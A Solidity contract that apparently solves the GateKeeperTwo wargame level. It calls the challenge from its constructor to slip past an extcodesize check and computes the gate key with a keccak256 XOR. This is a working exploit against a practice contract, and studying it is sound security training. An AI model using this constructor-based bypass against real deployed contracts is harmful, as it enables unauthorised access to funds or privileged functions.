// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './GateKeeperTwo.sol';

contract GateKeeperTwoAttack {

    GateKeeperTwo public challenge;

    constructor(address challengeAddress) public {
        challenge = GateKeeperTwo(challengeAddress);
        // must attack already in constructor because of extcodesize == 0
        // while the contract is being constructed
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        challenge.enter(bytes8(gateKey));
    }
}